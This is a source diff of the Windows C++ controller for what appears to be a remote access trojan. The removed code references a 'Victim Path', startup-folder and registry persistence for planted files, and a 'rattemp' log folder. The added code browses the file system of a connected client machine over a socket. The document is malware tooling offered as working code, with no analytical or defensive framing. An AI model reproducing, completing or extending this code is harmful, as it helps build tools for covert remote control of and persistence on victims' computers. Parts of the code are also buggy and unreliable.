@@ -640,7 +640,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         {
             std::wstring usrName = converter.from_bytes(pcUsername);
             ListView_SetItemText(hwndList, itemIndex, 4, (LPWSTR)usrName.c_str());
-            KillTimer(hwnd, 1);
+            KillTimer(hwnd, 1087);
         }
 
 
@@ -971,193 +971,113 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     return 0;
 };
 
+HWND hFtpList;
+LVCOLUMN lvColumn = { 0 };
+SOCKET FTPSOCK;
+FtpMenu ftpmenu;
+
 LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
-    ItemMenu dpItem;
-    HANDLE hFile;
-    int itemFileIndex = 0;
-    std::vector<std::wstring> fileNameStr;
-
     switch (uMsg)
     {
 
     case WM_CREATE:
     {
-        SOCKET selectedSocket = clientSockets[itemIndex];
-        auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-        send(selectedSocket, "requestdirs", strlen("requestdirs"), 0);
+        FTPSOCK = clientSockets[itemIndex];
+        auto it = std::find(clientSockets.begin(), clientSockets.end(), FTPSOCK);
+        
+        hFtpList = CreateWindowW(WC_LISTVIEW, L"", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL,
+            10, 10, 500, 300, FtpHwnd, NULL, GetModuleHandle(NULL), NULL);
 
-        hwndFileList = CreateWindowW(WC_LISTVIEW, L"",
-            WS_VISIBLE | WS_BORDER | WS_CHILD | LVS_SINGLESEL | LVS_REPORT | LVS_EDITLABELS,
-            10, 10, 555, 300,
-            FtpHwnd, (HMENU)210, hInstance, 0);
+        // Add columns to the list control
+        lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
+        lvColumn.pszText = (LPWSTR)L"Name";
+        lvColumn.cx = 200;
+        ListView_InsertColumn(hFtpList, 0, &lvColumn);
 
-        if (hwndFileList)
-        {
-            CreateColumn(hwndFileList, 25, 100, (wchar_t*)L"File");
-            CreateColumn(hwndFileList, 25, 100, (wchar_t*)L"Path");
-            CreateColumn(hwndFileList, 25, 100, (wchar_t*)L"Victim Path");
-        }
+        lvColumn.pszText = (LPWSTR)L"Size";
+        lvColumn.cx = 100;
+        ListView_InsertColumn(hFtpList, 1, &lvColumn);
 
-        dpItem.GlobalButtons(FtpHwnd);
-
+        SetTimer(FtpHwnd, 1440, 100, NULL);
         break;
     }
 
-    case WM_CONTEXTMENU:
+    case WM_NOTIFY:
     {
-        dpItem.CallItemMenu(hwndFileList, FtpHwnd);
-        break;
-    }
-
-    case WM_COMMAND:
-    {
-        switch (LOWORD(wParam))
+        if (((LPNMHDR)lParam)->code == NM_DBLCLK)
         {
-            case ITEM_RUN:
+            int itemIndex = ListView_GetNextItem(hFtpList, -1, LVNI_SELECTED);
+            if (itemIndex != -1)
             {
-                MessageBoxA(NULL, "RUN!", "Run", MB_OK);
-                break;
-            }
+                // Check if the selected item is a folder
+                wchar_t buffer[MAX_PATH];
+                LVITEM lvItem = { 0 };
+                lvItem.mask = LVIF_TEXT;
+                lvItem.iItem = itemIndex;
+                lvItem.iSubItem = 0;
+                lvItem.pszText = buffer;
+                lvItem.cchTextMax = MAX_PATH;
+                ListView_GetItem(hFtpList, &lvItem);
 
-            case FTP_ADD_FILES:
-            {
-                wchar_t filename[MAX_PATH];
-                const wchar_t* notAdded = L"Not Added";
-
-                OPENFILENAME ofn;
-                ZeroMemory(&filename, sizeof(filename));
-                ZeroMemory(&ofn, sizeof(ofn));
-                ofn.lStructSize = sizeof(ofn);
-                ofn.hwndOwner = NULL;
-                ofn.lpstrFilter = L"Text Files\0*.txt\0Exe Files\0*.exe\0Any File\0*.*\0\0";
-                ofn.lpstrFile = filename;
-                ofn.nMaxFile = MAX_PATH;
-                ofn.lpstrTitle = L"Select a File!";
-                ofn.Flags = OFN_DONTADDTORECENT | OFN_FILEMUSTEXIST | OFN_EXPLORER;
-                
-                if (GetOpenFileName(&ofn))
+                std::wstring selectedName = lvItem.pszText;
+                if (selectedName != L".." && (ListView_GetItemState(hFtpList, itemIndex, LVIS_CUT) & LVIS_CUT) == 0)
                 {
-                    wchar_t* fileTitle = PathFindFileName(filename);
-                    CreateItem(hwndFileList, fileTitle);
-                    ListView_SetItemText(hwndFileList, 0, 0, fileTitle);
-                    fileNameStr.push_back(fileTitle);
-                    ListView_SetItemText(hwndFileList, 0, 1, filename);
-                    ListView_SetItemText(hwndFileList, 0, 2, (LPWSTR)notAdded);
-                }
+                    std::wstring request = L"requestdirs " + selectedName;
+                    int len = WideCharToMultiByte(CP_UTF8, 0, request.c_str(), request.length(), NULL, 0, NULL, NULL);
+                    std::vector<char> requestBuffer(len + 1);
+                    WideCharToMultiByte(CP_UTF8, 0, request.c_str(), request.length(), requestBuffer.data(), len, NULL, NULL);
+                    int x = send(FTPSOCK, requestBuffer.data(), requestBuffer.size(), 0);
 
-                break;
-            }
+                    Sleep(100);
 
-            case ITEM_DEFAULT_PATH:
-            {
-                POINT cursorPos;
-                GetCursorPos(&cursorPos);
-                ScreenToClient(FtpHwnd, &cursorPos);
+                    char buffer[4096];
+                    int lenRecv = recv(FTPSOCK, buffer, sizeof(buffer), 0);
+                    if (lenRecv > 0)
+                    {
+                        //MessageBoxA(NULL, std::to_string(len).c_str(), "hi", MB_OK);
 
-                LVHITTESTINFO hitTestInfo;
-                hitTestInfo.pt = cursorPos;
-
-                HMENU hDefPathMenu = CreatePopupMenu();
-
-                InsertMenu(hDefPathMenu, 0, MF_BYPOSITION, DEF_PATH_STARTUP, L"Startup [FOLDER]");
-                InsertMenu(hDefPathMenu, 1, MF_BYPOSITION, 311, L"Startup [REGISTRY]");
-
-                MENUINFO mi = { 0 };
-                mi.cbSize = sizeof(MENUINFO);
-                mi.fMask = MIM_BACKGROUND;
-                mi.hbrBack = CreateSolidBrush(clrLightRed);
-
-                SetMenuInfo(hDefPathMenu, &mi);
-                GetCursorPos(&cursorPos);
-                TrackPopupMenu(hDefPathMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_NONOTIFY, cursorPos.x-50, cursorPos.y-50, 0, FtpHwnd, NULL);
-                
-                // Clean up
-                DestroyMenu(hDefPathMenu);
-
-                break;
-            }
-
-            case DEF_PATH_STARTUP:
-            {
-                SOCKET selectedSocket = clientSockets[itemIndex];
-                auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-                //send(selectedSocket, "requsr", strlen("requsr"), 0);
-
-                Sleep(500);
-                TCHAR clientUsername[260 + 1];
-                memset(clientUsername, 0, sizeof(clientUsername));
-                DWORD usernameLen = 260 + 1;
-                std::string usernameStr(clientUsername, clientUsername + usernameLen);
-                int bytesReceived = 0;
-
-                while (bytesReceived < usernameLen) {
-                    int result = recv(selectedSocket, const_cast<char*>(usernameStr.c_str() + bytesReceived), usernameLen - bytesReceived, 0);
-                    if (result == SOCKET_ERROR) {
-                        // handle socket error
-                        break;
+                        ftpmenu.UpdateItems(FtpHwnd, hFtpList, buffer, lenRecv);
                     }
-                    bytesReceived += result;
                 }
-
-                if (bytesReceived > 0) {
-                    // handle successful receive
-                    MessageBoxA(NULL, usernameStr.c_str(), "s", MB_OK);
-                    // Successfully received username
-                    /*
-                        Now process the username
-                        actually im an idiot
-                        FUCK JUST SEND THE FILE :(((
-                        CLIENT WILL PROCESS USERNAME I AM IDIOT
-                    */
-                }
-                
-                break;
             }
-
-            case FTP_REMALL_FILES:
-            {
-                int iCount = ListView_GetItemCount(hwndFileList);
-
-                for (int items = 0; items < iCount; items++)
-                {
-                    int itemDel = 0;
-                    ListView_DeleteItem(hwndFileList, itemDel);
-                    itemDel = itemDel + items;
-                }
-                
-
-                break;
-            }
-
-            default:
-                return DefWindowProc(FtpHwnd, uMsg, wParam, lParam);
-
         }
+        break;
+    }
+
+    case WM_TIMER:
+    {
+        if (LOWORD(wParam == 1440))
+        {
+            send(FTPSOCK, "requestdirs", strlen("requestdirs"), 0);
+
+            Sleep(100);
+
+            char buffer[4096];
+            int len = recv(FTPSOCK, buffer, sizeof(buffer), 0);
+            if (len > 0)
+            {
+
+                ftpmenu.UpdateItems(FtpHwnd, hFtpList, buffer, len);
+                KillTimer(FtpHwnd, 1440);
+            }
+            else if (len == 0)
+            {
+                // Client disconnected
+                closesocket(FTPSOCK);
+            }
+            KillTimer(FtpHwnd, 1440);
+        }
+
         break;
     }
 
     case WM_DESTROY:
     {
-        std::wstring currentLog = GetCurrentSocketFromVector();
-        std::wofstream fileOut(L"C:\\Users\\mineo\\Desktop\\rattemp\\" + currentLog + L".txt");
-        if (!fileNameStr.empty())
-        {
-            for (const auto& itn : fileNameStr)
-            {
-                fileOut << itn << std::endl;
-            }
-        }
-        else
-        {
-            fileOut << "Empty here!" << "\n";
-        }
-        
-        fileOut.close();
-
         DestroyWindow(hwndFTP);
         break;
     }
+
 
     case WM_CLOSE:
     {
@@ -1168,6 +1088,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
     default:
         return DefWindowProc(FtpHwnd, uMsg, wParam, lParam);
     }
+
     return 0;
 }
 
